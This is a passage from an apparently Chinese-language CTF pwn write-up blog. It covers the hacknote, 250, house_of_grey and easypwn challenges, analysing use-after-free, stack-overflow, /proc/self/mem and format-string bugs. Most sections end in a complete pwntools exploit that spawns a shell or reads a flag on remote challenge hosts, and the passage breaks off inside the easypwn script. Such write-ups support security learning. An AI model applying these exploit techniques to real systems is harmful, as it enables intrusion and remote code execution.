</span><br><span class="line">s = <span class="built_in">str</span>(data) </span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">bytes</span>(s, encoding = <span class="string">&quot;utf8&quot;</span>) + <span class="string">b&#x27;c%14$hhn&#x27;</span>  </span><br><span class="line">data = ((system_addr &amp; <span class="number">0xFFFFFF</span>) &gt;&gt; <span class="number">8</span>) - data  </span><br><span class="line">s = <span class="built_in">str</span>(data) </span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">bytes</span>(s, encoding = <span class="string">&quot;utf8&quot;</span>) + <span class="string">b&#x27;c%15$hn&#x27;</span>  </span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">b&#x27;B&#x27;</span>) + p64(printf_got) + p64(printf_got+<span class="number">1</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;slogan: &#x27;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#get shell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;slogan: &#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109181646152.png" alt="image-20210109181646152"></p>
<h3 id="30-hacknote"><a href="#30-hacknote" class="headerlink" title="30. hacknote"></a>30. hacknote</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109181709858.png" alt="image-20210109181709858"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213201788.png" alt="image-20201201213201788"></p>
<h4 id="代码分析-25"><a href="#代码分析-25" class="headerlink" title="代码分析"></a>代码分析</h4><p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213310802.png" alt="image-20201201213310802"></p>
<p>删除堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213328651.png" alt="image-20201201213328651"></p>
<p>输出堆的内容：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213346639.png" alt="image-20201201213346639"></p>
<p>添加堆：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213401902.png" alt="image-20201201213401902"></p>
<p>自定义的输出函数</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213619289.png" alt="image-20201201213619289"></p>
<p>整个程序分析下来，流程大概是，有一个指针数组ptr。每次新建的时候，ptr申请一个起控制作用的0x8大小的堆（control_chunk），这个堆首先放入自定义的一个输出函数put，然后再指向相应的申请的size大小的存放内容的堆(data_chunk)。在删除时，并没用将指针置null，这里就有UAF漏洞。</p>
<p>而print函数中的<code>(*ptr[v1])(ptr[v1]);</code>实际上就是调用*ptr[v1]的函数（也就是自定义的put函数），ptr[v1]作为函数的参数。正常情况下，是输出ptr[v1+4]指向的内容，即输入的数据。</p>
<p>用图来说明关系：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214918029.png" alt="image-20201201214918029"></p>
<h4 id="思路及利用-24"><a href="#思路及利用-24" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>根据上述的分析，显然这道题主要是利用UAF。control_chunk的大小是0x8，释放后会在fastbin中，利用fastbin的特性就可以再申请大小0x8的chunk，对释放的chunk进行写操作。</p>
<p>也就是说，申请两个超过fastbin大小的chunk，然后释放。再申请0x8大小的chunk，这时候就可以向control_chunk进行写操作来执行需要的函数。（这里申请两个超过fastbin大小的chunk，是因为申请0x8的data_chunk还需要一个0x8的control_chunk，而且需要注意fastbin是采用单向链表维护，并且遵循<strong>后进先出</strong>的规则） </p>
<p>首先，需要泄露libc的基地址，这里可以利用自定义的put函数，输出got表项。这里选择free函数。</p>
<p>得到基地址后，只需要将control_chunk的fd改为system的地址，然后再写入参数‘sh’即可。这里就需要先将chunk2释放。但是进入fastbin的chunk仍是之前的两个，所以和之前一样，再次申请的chunk仍可以修改control_chunk1。</p>
<p>这里有一点需要注意的是，执行``(*ptr[v1])(ptr[v1])`时，相当于system（&amp;systemsh）显然是不能正确执行的。需要用一点小技巧，改为system（&amp;system||sh）。</p>
<p>图片演示过程：</p>
<ul>
<li>申请两个chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201222619001.png" alt="image-20201201222619001"></p>
<ul>
<li>依次删除0、1后再申请0x8的chunk</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223133135.png" alt="image-20201201223133135"></p>
<p><strong>这时候就可以通过ptr[2]向control_chunk0写入数据。</strong></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">30500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">free_got= elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">put = <span class="number">0x804862b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p32(put)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libcbase=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">payload = p32(system)+<span class="string">b&#x27;||sh&#x27;</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223434405.png" alt="image-20201201223434405"></p>
<h3 id="31-250"><a href="#31-250" class="headerlink" title="31. 250"></a>31. 250</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109181948534.png" alt="image-20210109181939783"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109182000707.png" alt="image-20210109182000707"></p>
<h4 id="代码分析-26"><a href="#代码分析-26" class="headerlink" title="代码分析"></a>代码分析</h4><p>程序很简单，确定输入的大小，然后输入数据，最后打印输入的数据。</p>
<p>在打印函数中发现漏洞，一个明显的栈溢出。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109195804597.png" alt="image-20210109195804597"></p>
<h4 id="思路及分析-1"><a href="#思路及分析-1" class="headerlink" title="思路及分析"></a>思路及分析</h4><p>整个程序是静态编译，那么有很多方法获得shell。</p>
<p>而漏洞也是简单的栈溢出，这里选择一个比较特别的方式来得到shell，程序开启了堆栈不可执行，但是可以使用dl_make_stack_executable使得栈变得可执行。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109200342787.png" alt="image-20210109200342787"></p>
<p>也就是将返回地址覆盖，转而执行l_make_stack_executable。为了不考虑参数ret到0x809a260：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109200915311.png" alt="image-20210109200915311"></p>
<p>我们还得事先设置好ebp的值，使得[ebp+arg_10]为__libc_stack_end的地址，目的是为了绕过这里的检查</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109201009960.png" alt="image-20210109201009960"></p>
<p>接下来利用gadgets修改_dl_make_stack_executable_hook的值。</p>
<p>这样ret时，就会不到原来的地方，而是回到栈里的ROP gadgets</p>
<p>于是，我们再用jmp esp来继续跳转到栈里，执行shellcode</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">54634</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./250&#x27;</span>)  </span><br><span class="line">_dl_make_stack_executable_hook = elf.symbols[<span class="string">&#x27;_dl_make_stack_executable_hook&#x27;</span>]  </span><br><span class="line"></span><br><span class="line">call_dl_make_stack_executable = <span class="number">0x809A260</span>  </span><br><span class="line"><span class="comment">#inc dword ptr [ecx] ; ret  </span></span><br><span class="line">inc_p_ecx = <span class="number">0x080845f8</span>  </span><br><span class="line">pop_ecx = <span class="number">0x080df1b9</span>  </span><br><span class="line">jmp_esp = <span class="number">0x080de2bb</span>  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;SSCTF[InPut Data Size]&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x3A</span> + p32(<span class="number">0x80A0B05</span> - <span class="number">0x18</span>)  </span><br><span class="line"><span class="comment">#修改_dl_make_stack_executable_hook，偏移一个push，这样ret时就不会返回到原来的位置  </span></span><br><span class="line">payload += p32(pop_ecx) + p32(_dl_make_stack_executable_hook) + p32(inc_p_ecx)  </span><br><span class="line"><span class="comment">#调用_dl_make_stack_executable让栈变得可执行，并跳到栈里继续执行shellcode  </span></span><br><span class="line">payload += p32(call_dl_make_stack_executable) + p32(jmp_esp)  </span><br><span class="line"><span class="comment">#shellcode  </span></span><br><span class="line">payload += asm(shellcraft.i386.linux.sh())  </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;SSCTF[YourData]&#x27;</span>,payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109201354062.png" alt="image-20210109201354062"></p>
<h2 id="七分题"><a href="#七分题" class="headerlink" title="七分题"></a>七分题</h2><h3 id="32-house-of-grey"><a href="#32-house-of-grey" class="headerlink" title="32. house_of_grey"></a>32. house_of_grey</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203109876.png" alt="image-20210109203109876"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203136022.png" alt="image-20210109203136022"></p>
<h4 id="代码分析-27"><a href="#代码分析-27" class="headerlink" title="代码分析"></a>代码分析</h4><p>整个程序的是一个读取文件并显示的程序，除了flag文件，其他文件都可以读取。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203629494.png" alt="image-20210109203629494"></p>
<p>找到一个溢出点</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203723958.png" alt="image-20210109203723958"></p>
<p>还有buf也可以溢出</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109203816411.png" alt="image-20210109203816411"></p>
<p>两个结合，就可以通过溢出buf修改v8，利用选项4实现任意地址的写。</p>
<p>lseek是一个用于改变读写一个文件时读写指针位置的一个系统调用。指针位置可以是绝对的或者相对的。选项2可以指定文件读写指针的位置。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109204009502.png" alt="image-20210109204009502"></p>
<h4 id="思路及利用-25"><a href="#思路及利用-25" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>程序保护全开，所以要获得shell，只能利用栈溢出进行rop。而要进行rop就要知道程序基地址（由于开了PIE）和mmap映射区域地址（我们要读mem）。</p>
<p>这里就需要了解maps和mem。</p>
<p>Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p>
<p>读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p>
<p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。</p>
<p>首先可以通过输入<code>/proc/self/maps</code>获得程序基地址（第一行），heap基地址（第四行），mmap映射区域的地址（第五行）还有libc链接基地址（第六行）。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109204912476.png" alt="image-20210109204912476"></p>
<p>然后就是读取men，我们把文件指针改为mmap地址后就可以读取mem了，这里我们主要是要读取出我们的v8的值，而函数的返回地址就在v8 - 0x38的地方。</p>
<p>我们在功能一时把‘/proc/self/mem’放到了buf字段里，而v8也在这里，并且距离buf字段0x50 - 0x38 = 0x18。所以，我们只要找到字符串‘proc/self/mem’就可以拿到v8的地址了。</p>
<p>然而这个程序只能运行30次，还需要两次进行字符填充，所以这里我们只能使用24次来搜索字符串‘proc/self/mem’了。<br>这样我们就不能保证脚本每次攻击能成功，但概率还是在可以接受的范围之内的。</p>
<p>之后就是常规rop。填充v8指针为返回地址，通过功能四对v8指针的调用劫持程序流程，使得程序执行我们的ROP链，达到输出flag的目的。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41119</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_grey&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find</span>(<span class="params">buf</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;So man, what are you finding?\n&#x27;</span>, <span class="built_in">str</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Locate</span>(<span class="params">buf</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;So, Where are you?\n&#x27;</span>, <span class="built_in">str</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;How many things do you want to get?\n&#x27;</span>, <span class="string">&#x27;100000&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.Exit\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;What do you want to give me?\n&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Do you want to help me build my room? Y/n?\n&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">Find(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">get()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;-&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line">open_ad = elf.sym[<span class="string">&#x27;open&#x27;</span>] + elf_base</span><br><span class="line">read_ad = elf.sym[<span class="string">&#x27;read&#x27;</span>] + elf_base</span><br><span class="line">prdi = elf_base + <span class="number">0x0000000000001823</span></span><br><span class="line">prsi_r15 = elf_base + <span class="number">0x0000000000001821</span></span><br><span class="line">puts_ad = elf.sym[<span class="string">&#x27;puts&#x27;</span>] + elf_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;heap&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">    	line = p.recvline()</span><br><span class="line">        mmap_ad = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Find(<span class="string">&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">Locate(mmap_ad)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">    get()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;You get something:\n&#x27;</span>)</span><br><span class="line">    mem = p.recvuntil(<span class="string">&#x27;1.Find&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/proc/self/mem&#x27;</span> <span class="keyword">in</span> mem:</span><br><span class="line">        bef = mem.split(<span class="string">&#x27;/proc/self/mem&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        v8_ad = mmap_ad + i * <span class="number">100000</span> + <span class="built_in">len</span>(bef)</span><br><span class="line">        ret_ad = v8_ad - <span class="number">0x38</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> i ==<span class="number">23</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;No!No!No!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/proc/self/mem&quot;</span>.ljust(<span class="number">0x18</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(ret_ad)</span><br><span class="line">Find(payload)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x8</span> * <span class="number">15</span></span><br><span class="line">flag_ad = ret_ad + offset</span><br><span class="line"></span><br><span class="line">payload = p64(prdi) + p64(flag_ad) + p64(prsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(open_ad)</span><br><span class="line">payload += p64(prdi) + p64(<span class="number">6</span>) + p64(prsi_r15) + p64(flag_ad) + p64(<span class="number">0</span>) + p64(read_ad)</span><br><span class="line">payload += p64(prdi) + p64(flag_ad) + p64(puts_ad)</span><br><span class="line">payload += <span class="string">&#x27;/home/ctf/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">give(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109210038613.png" alt="image-20210109210038613"></p>
<h3 id="33-easypwn"><a href="#33-easypwn" class="headerlink" title="33. easypwn"></a>33. easypwn</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201225035214.png" alt="image-20201201225035214"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209094754572.png" alt="image-20201209094754572"></p>
<p>RELRO部分开启，可以改写GOT表。</p>
<h4 id="代码分析-28"><a href="#代码分析-28" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095207906.png" alt="image-20201209095207906"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095323845.png" alt="image-20201209095323845"></p>
<p>可以看到，read的范围很大，但是没法溢出栈底。</p>
<blockquote>
<p><strong>int snprintf(char *str, size_t size, const char *format, …)</strong> 设将可变参数(…)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。</p>
</blockquote>
<p>因此，通过snprintf可以将v2溢出覆盖v3。</p>
<h4 id="思路及利用-26"><a href="#思路及利用-26" class="headerlink" title="思路及利用"></a>思路及利用</h4><blockquote>
<p>通过实验发现，程序应该是使用的libc-2.23，需在相应环境下进行调试。</p>
</blockquote>
<p>v3是格式化字符串，上述分析知道可以将v3改写。利用格式化字符串做到任意地址读写。</p>
<p>这里涉及到snprintf函数的原理。</p>
<blockquote>
<p>snprintf把格式化字符串的地址记下来，然后，每次要处理一个字符时，先从地址处取格式化字符串，然后再根据格式化字符串来处理字符。</p>
</blockquote>
<p>这里地址没有改变，只是地址指向的内容变了。因此，v3改变了，整个格式化字符串就跟着变了。而不是先传入“%s”，snprintf函数就执行“%s”。</p>
<p>有了格式化字符串之后，就考虑如何得到shell。</p>
<p>目前已知，能够改写got表，能够任意地址写。很自然的想到改写某个函数的got为system。同时如之前的‘’greeting-150”，需要考虑到传参问题。</p>
<p>选择free函数的got改为system的plt，在“Input Your Name:”中输入“/bin/sh”。这样执行free（buf），就能得到shell。</p>
<p>整个程序没有使用system，需要先泄露地址。</p>
<p>分析在执行snprintf，且尚未对rsp进行调整时的栈情况：</p>
<p>输入为“aaaa”</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209104042184.png" alt="image-20201209104042184"></p>
<p>发现，可以泄露__libc_start_main+240的地址。</p>
<p>计算偏移：(0x7fffffffdfe8-0x7fffffffd380)/8=397</p>
<p>同样获得init的地址。</p>
<p>这样就可以泄露libc，然后就是修改free的got表。</p>
<p>编写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">40691</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">payload</span>):</span></span><br><span class="line">	<span class="built_in">print</span> r.recvuntil(<span class="string">&quot;Input Your Code:\n&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> r.recvuntil(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>)	</span><br><span class="line">	r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setName</span>(<span class="params">name</span>):</span></span><br><span class="line">	<span class="built_in">print</span> r.recvuntil(<span class="string">&quot;Input Your Code:\n&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> r.recvuntil(<span class="string">&quot;Input Your Name:\n&quot;</span>)	</span><br><span class="line">	r.sendline(name)</span><br><span class="line"></span><br><span class="line">setName(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding_num = <span class="number">0x7f8</span> - <span class="number">0x410</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * padding_num + <span class="string">&#x27;bb%397$p&#x27;</span></span><br><span 